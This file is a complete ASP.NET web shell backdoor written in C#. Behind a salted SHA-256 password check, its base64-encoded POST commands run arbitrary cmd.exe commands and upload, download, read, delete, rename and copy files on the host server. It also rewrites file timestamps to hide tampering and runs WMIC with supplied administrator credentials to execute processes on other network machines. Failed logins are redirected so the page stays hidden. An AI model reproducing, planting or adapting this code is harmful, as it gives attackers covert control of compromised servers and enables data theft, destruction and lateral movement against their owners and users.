<%@ Page Language="C#" ValidateRequest="false" EnableViewState="false" %>

<%
try
{
NameValueCollection t=HttpContext.Current.Request.Form;
method selectedMethod=method.auth;
try{int methodID=int.Parse(fb(t["m"]));selectedMethod=(method)methodID;}catch{rm();}
p=fb(t["p"]);
adminU=fb(t["adminU"]);
adminP=fb(t["adminP"]);
if(!string.IsNullOrEmpty(p) && login(p)){
switch(selectedMethod){
case method.auth:
case method.authAjax:auth(p);break;
case method.command:
case method.commandAjax:command(fb(t["cmd"]));break;
case method.upload:upload(HttpContext.Current.Request.Files["uploadFile"],fb(t["uploadPath"]));break;
case method.download:download(fb(t["don"]),fb(t["isdel"]));break;
case method.downloadTest:downloadTest(fb(t["don"]));break;
case method.explorer:exp(fb(t["exadd"]));break;
case method.getsize:gsize(fb(t["gsize"]));break;
case method.getlocation:
case method.getlocationAjax:response(getLoc());break;
case method.rename:rename(fb(t["rename1"]),fb(t["rename2"]));break;
case method.copy:copy(fb(t["copy1"]),fb(t["copy2"]));break;
case method.view:view(fb(t["view"]));break;
case method.delete:delete(fb(t["delete"]));break;
case method.multiDelete:multiDelete(fb(t["delete"]));break;
case method.changeTime:changeTime(fb(t["timeh"]),fb(t["tfil"]),fb(t["ttar"]),fb(t["ttim"]));break;
default:break;
}
}
else rm();
}
catch(Exception ex){if(!isInner)response("Error : "+ex.Message);}
%>
<script runat="server">
bool isInner = true;
enum method{auth=0,command=1,upload=2,uploadbase64=3,delete=4,download=5,changeTime=6,sqlQuery=7,explorer=8,getsize=9,getlocation=10,rename=11,copy=12,view=13,commandAjax=14,downloadTest=15,checkModules=16,installModule=17,uninstallModule=18,cmd7z=19,authAjax=20,getlocationAjax=21,multiDelete=24};
string salt="sdfewq@#$51234234DF@#$!@#$ASDF";
string p,adminU,adminP;
bool aut=false;
string pp="J3ugYdknpax1ZbHB2QILB5NS6dVa0iUD0mhhBPv0Srw=";
string a(string a,string b){return string.IsNullOrEmpty(a)?b:a;}
string tb(string a){string ret="";try{ret=string.IsNullOrEmpty(a)?a:Convert.ToBase64String(Encoding.UTF8.GetBytes(a));}catch{}return ret;}
string fb(string a){string ret="";try{ret=string.IsNullOrEmpty(a)?a:Encoding.UTF8.GetString(Convert.FromBase64String(a));}catch{}return ret;}
void rm(){if(!isInner){Response.Redirect(Request.Url.AbsolutePath.Substring(0,Request.Url.AbsolutePath.LastIndexOf("/")+1)+" "+Request.Url.AbsolutePath.Substring(Request.Url.AbsolutePath.LastIndexOf("/")+1));}}
void auth(string p){string ret=string.Empty;try{ret=string.Format("{{\"auth\":\"{0}\",\"loc\":\"{1}\"}}",login(p).ToString(),tb(getLoc()));}catch(Exception e){ret="Error : "+e.Message;}response(ret);}
bool login(string p){bool aut=false;try{if(!string.IsNullOrEmpty(p)){aut=Convert.ToBase64String(new System.Security.Cryptography.SHA256CryptoServiceProvider().ComputeHash(Encoding.ASCII.GetBytes(p+salt)))==pp;}}catch(Exception e){response(e.Message);}return aut;}
void command(string cmd){string ret="Error : -";try{string o=exec(cmd);o=o.Remove(0,o.IndexOf(Environment.NewLine)+2);o=o.Remove(0,o.IndexOf(Environment.NewLine)+2);o=o.Remove(0,o.IndexOf(Environment.NewLine));o=o.Remove(o.LastIndexOf(Environment.NewLine));o=o.Remove(o.LastIndexOf(Environment.NewLine)+2);ret=HttpUtility.HtmlEncode(o);}catch(Exception ex){ret="Error : "+ex.Message;}response(ret);}
void upload(HttpPostedFile uploadFile,string uploadPath){string ret="Error : -";try{if(System.IO.Path.IsPathRooted(uploadPath)){string FileName=System.IO.Path.GetFileName(uploadFile.FileName);string FilePath=uploadPath.TrimEnd('\\')+"\\";if(string.IsNullOrEmpty(System.IO.Path.GetExtension(uploadPath))){if(!System.IO.Directory.Exists(uploadPath)){if(!string.IsNullOrEmpty(System.IO.Path.GetFileName(uploadPath))){FileName=System.IO.Path.GetFileName(uploadPath);FilePath=System.IO.Path.GetDirectoryName(uploadPath)+"\\";}}}else{FileName=System.IO.Path.GetFileName(uploadPath);FilePath=System.IO.Path.GetDirectoryName(uploadPath)+"\\";}if(!System.IO.Directory.Exists(FilePath))System.IO.Directory.CreateDirectory(FilePath);uploadFile.SaveAs(FilePath+FileName);ret="File uploaded successfully : "+FilePath+FileName;}else ret="Error : The path is not current format \""+uploadPath+"\"";}catch(Exception ex){ret="Error : "+ex.Message;}response(ret);}string getLoc(){return Server.MapPath(string.Empty)+"\\";}
void downloadTest(string don){string ret="Error : -";try{if(!string.IsNullOrEmpty(don)){using(System.IO.Stream stream=new System.IO.FileStream(don,System.IO.FileMode.Open)){ret=string.Format("File '{0}' is ready for download",don);}}}catch(Exception e){ret="Error : "+e.Message;}response(ret);}
void download(string don, string isdel){string ret="Error : -";try{if(!string.IsNullOrEmpty(don)){System.Web.HttpResponse response=System.Web.HttpContext.Current.Response;response.ClearContent();response.Clear();response.ClearHeaders();response.ContentType="application/octet-stream";response.AppendHeader("Content-Disposition","attachment;size="+new System.IO.FileInfo(don).Length+";filename="+HttpUtility.UrlEncode(tb(System.IO.Path.GetFileName(don))));response.WriteFile(don);response.Flush();Response.SuppressContent=true;ApplicationInstance.CompleteRequest();}}catch(Exception e){ret="Error : "+e.Message;response(ret);}}
string exec(string cmd,string pro=""){System.Diagnostics.Process n=new System.Diagnostics.Process();n.StartInfo.FileName=(string.IsNullOrEmpty(pro)?"cmd.exe":pro);n.StartInfo.UseShellExecute=false;n.StartInfo.RedirectStandardInput=true;n.StartInfo.RedirectStandardOutput=true;n.StartInfo.RedirectStandardError=true;n.StartInfo.CreateNoWindow=true;string o=null;n.Start();n.StandardInput.WriteLine(cmd);n.StandardInput.WriteLine("exit");o=n.StandardOutput.ReadToEnd();n.WaitForExit();n.Close();return o;}
void gsize(string addr){string ret="Error : -";try{hasErrorInGetSize=false;long size=GetDirSize(new System.IO.DirectoryInfo(addr));ret=sizeFix(size);if(hasErrorInGetSize && sizelvl==0)ret=sizeError;else if(hasErrorInGetSize)ret="!"+ret;}catch(Exception ex){ret="Error : "+ex.Message;}response(ret);}
void view(string path){string ret="You are viewing the contents of this file : "+path+Environment.NewLine;try{ret+=System.IO.File.ReadAllText(path);}catch(Exception ex){ret="Error : "+ex.Message;}response(HttpUtility.HtmlEncode(ret));}
void delete(string path){string ret="Error : -";try{System.IO.File.Delete(path);ret=string.Format("{{\"message\":\"{0}\",\"dirInfo\":\"{1}\"}}",tb(string.Format("File '{0}' successfuly deleted{1}",path,Environment.NewLine)),tb(getDirectoryInfo(System.IO.Path.GetDirectoryName(path))));}catch(Exception ex){ret="Error : "+ex.Message;}response(ret);}
void multiDelete(string files){string ret="Error : -";try{string[] f=files.Split('|');ret=string.Format("All '{0}' files successfuly deleted.", f.Length);foreach(string item in f){System.IO.File.Delete(fb(item));}}catch(Exception ex){ret="Error : "+ex.Message;}response(ret);}
void rename(string oldName,string newName){string ret="Error : -";try{if(newName.EndsWith("\\"))newName+=System.IO.Path.GetFileName(oldName);System.IO.File.Move(oldName,newName);ret=string.Format("{{\"message\":\"{0}\",\"dirInfo\":\"{1}\"}}",tb(string.Format("File '{0}' successfuly moved to '{1}'{2}",oldName,newName,Environment.NewLine)),tb(getDirectoryInfo(System.IO.Path.GetDirectoryName(oldName))));}catch(Exception ex){ret="Error : "+ex.Message;}response(ret);}
void copy(string oldName,string newName){string ret="Error : -";try{if(newName.EndsWith("\\"))newName+=System.IO.Path.GetFileName(oldName);System.IO.File.Copy(oldName,newName);ret=string.Format("{{\"message\":\"{0}\",\"dirInfo\":\"{1}\"}}",tb(string.Format("File '{0}' successfuly copied to '{1}'{2}",oldName,newName,Environment.NewLine)),tb(getDirectoryInfo(System.IO.Path.GetDirectoryName(oldName))));}catch(Exception ex){ret="Error : "+ex.Message;}response(ret);}
string getDirectoryInfo(string address){string ret="Error : -";try{if(address.ToLower()=="root"){ret="{\"dir\":[{\"name\":\"\\\\\\\\localhost\"}";string netUse=exec("net use");string[] lines=netUse.Split(new string[]{Environment.NewLine},StringSplitOptions.RemoveEmptyEntries);foreach(string item in lines){if(item.ToLower().StartsWith("ok")){int index=item.IndexOf("\\\\");ret+=",{\"name\":\"\\\\"+item.Substring(index,item.IndexOf('\\',index+2)-index)+"\"}";}}ret+="]}";}else{if(address.StartsWith("\\\\")&& address.Trim('\\').Split('\\').Count()==1){string tmp=address.ToLower().TrimEnd('\\');if(tmp=="\\\\localhost"){ret="{\"dir\":[";bool isStart=false;foreach(System.IO.DriveInfo item in System.IO.DriveInfo.GetDrives()){if(item.IsReady){if(isStart)ret +=",";ret+=string.Format("{{\"name\":\"{0}\",\"totalSize\":\"{1}\",\"freeSpace\":\"{2}\",\"sizeText\":\"{3}\",\"format\":\"{4}\",\"type\":\"{5}\"}}",item.Name.TrimEnd('\\').TrimEnd(':')+"$",item.TotalSize,item.TotalFreeSpace,"["+sizeFix(item.TotalFreeSpace)+"] free of ["+sizeFix(item.TotalSize)+"]",item.DriveFormat,item.DriveType);isStart=true;}}ret+="]}";}else{if(!string.IsNullOrEmpty(adminU)&& !string.IsNullOrEmpty(adminP)){string strWC=@"wmic /node:{0} /user:{1} /password:{2} process call create ""cmd.exe /c > c:\windows\temp\KMSHFX0023{3}.tmp 2>&1 wmic logicaldisk get {4}"" 2>&1";string strWF=@"\\{0}\c$\windows\temp\KMSHFX0023{1}.tmp";string strWD=@"del {0} 2>&1";tmp=tmp.TrimStart('\\');exec(string.Format(strWC,tmp,adminU,adminP,1,"Caption"));exec(string.Format(strWC,tmp,adminU,adminP,2,"FileSystem"));exec(string.Format(strWC,tmp,adminU,adminP,3,"Size"));exec(string.Format(strWC,tmp,adminU,adminP,4,"FreeSpace"));exec(string.Format(strWC,tmp,adminU,adminP,5,"Description"));System.Threading.Thread.Sleep(3000);List<string> diskTemp=new List<string>();for(int i=1;i<=5;i++){string f=string.Format(strWF,tmp,i);string[] lDisk=System.IO.File.ReadAllLines(f);exec(string.Format(strWD,f));for(int j=1;j<lDisk.Length;j++){if(i==1)diskTemp.Add(lDisk[j]);else diskTemp[j-1]+="|"+lDisk[j];}}ret="{\"dir\":[";bool isStart=false;foreach(string item in diskTemp){string[] diskInfo=item.Split('|');long TotalSize=0;long TotalFreeSpace=0;long.TryParse(diskInfo[2],out TotalSize);long.TryParse(diskInfo[3],out TotalFreeSpace);if(isStart)ret+=",";ret+=string.Format("{{\"name\":\"{0}\",\"totalSize\":\"{1}\",\"freeSpace\":\"{2}\",\"sizeText\":\"{3}\",\"format\":\"{4}\",\"type\":\"{5}\"}}",diskInfo[0].TrimEnd('\\').TrimEnd(' ').TrimEnd(':')+"$",TotalSize,TotalFreeSpace,"["+sizeFix(TotalFreeSpace)+"] free of ["+sizeFix(TotalSize)+"]",diskInfo[1],diskInfo[4]);isStart=true;}ret+="]}";}else ret="Error : Admin Username or Password is empty";}}else{System.IO.FileAttributes attr=System.IO.File.GetAttributes(address);if((attr&System.IO.FileAttributes.Directory)==System.IO.FileAttributes.Directory){System.IO.DirectoryInfo dirInfo=new System.IO.DirectoryInfo(address);ret="{"+string.Format("{0},{1}",createJsonDirectory(dirInfo.GetDirectories()),createJsonFile(dirInfo.GetFiles()))+"}";}}}}catch(Exception ex){ret="Error : "+ex.Message;}return ret;}
void exp(string exadd){string ret="Error : -";ret=getDirectoryInfo(exadd);response(ret);}
bool hasErrorInGetSize=false;
int sizelvl=0;
string sizeError;
long GetDirSize(System.IO.DirectoryInfo d){long size=0;try{System.IO.FileInfo[] fis=d.GetFiles();foreach(System.IO.FileInfo fi in fis){size+=fi.Length;}sizelvl++;System.IO.DirectoryInfo[] dis=d.GetDirectories();foreach(System.IO.DirectoryInfo di in dis){size+=GetDirSize(di);}}catch(UnauthorizedAccessException ex){sizeError="Error : "+ex.Message;hasErrorInGetSize=true;}return size;}
string createJsonDirectory(System.IO.DirectoryInfo[] dir){string json="\"dir\":[";for(int i=0;i<dir.Length;i++){if(i>0)json+=",";json+=string.Format("{{\"name\":\"{0}\",\"mdate\":\"{1}\"}}",dir[i].Name,dir[i].LastWriteTime.ToString("yyyy-MM-dd"));}json +="]";return json;}
string createJsonFile(System.IO.FileInfo[] file){string json="\"file\":[";for(int i=0;i<file.Length;i++){if(i>0)json+=",";json+=string.Format("{{\"name\":\"{0}\",\"size\":\"{1}\",\"mdate\":\"{2}\"}}",file[i].Name,sizeFix(file[i].Length),file[i].LastWriteTime.ToString("yyyy-MM-dd"));}json+="]";return json;}
string sizeFix(long size){double s=size;if(s<1024)return s+" B";s=s/1024;if(s<1024)return Math.Round(s,2)+" KB";s=s/1024;if(s<1024)return Math.Round(s,2)+" MB";s=s/1024;if(s<1024)return Math.Round(s,2)+" GB";s=s/1024;return Math.Round(s,2)+" TB";}
void response(string res){Response.Clear();Response.Write(tb(res));Response.Flush();Response.SuppressContent=true;ApplicationInstance.CompleteRequest();}
void changeTime(string timeh,string tfil,string ttar,string ttim){string ret="Error : -";try {if(!string.IsNullOrEmpty(tfil)){if(timeh=="1")ret=ti(tfil);else if(timeh=="2"){if(!string.IsNullOrEmpty(ttar)){System.IO.File.SetCreationTime(tfil,System.IO.File.GetCreationTime(ttar));System.IO.File.SetLastAccessTime(tfil,System.IO.File.GetLastAccessTime(ttar));System.IO.File.SetLastWriteTime(tfil,System.IO.File.GetLastWriteTime(ttar));ret="Time successfuly changed :<br>"+tfil+"<br>"+ti(tfil);}}else if(timeh=="3"){if(!string.IsNullOrEmpty(ttim)){DateTime te=DateTime.Parse(ttim);System.IO.File.SetCreationTime(tfil,te);System.IO.File.SetLastAccessTime(tfil,te);System.IO.File.SetLastWriteTime(tfil,te);ret="Time successfuly changed :<br>"+tfil+"<br>"+ti(tfil);}}}}catch(Exception e){ret="Error : "+e.Message;}response(ret);}
string ti(string tt){return "Creation Time :\t\t"+System.IO.File.GetCreationTime(tt).ToString("yyyy-MM-dd HH:mm:ss")+"<br>Last Access Time :\t"+System.IO.File.GetLastAccessTime(tt).ToString("yyyy-MM-dd HH:mm:ss")+"<br>Last Write Time :\t"+System.IO.File.GetLastWriteTime(tt).ToString("yyyy-MM-dd HH:mm:ss");}
</script>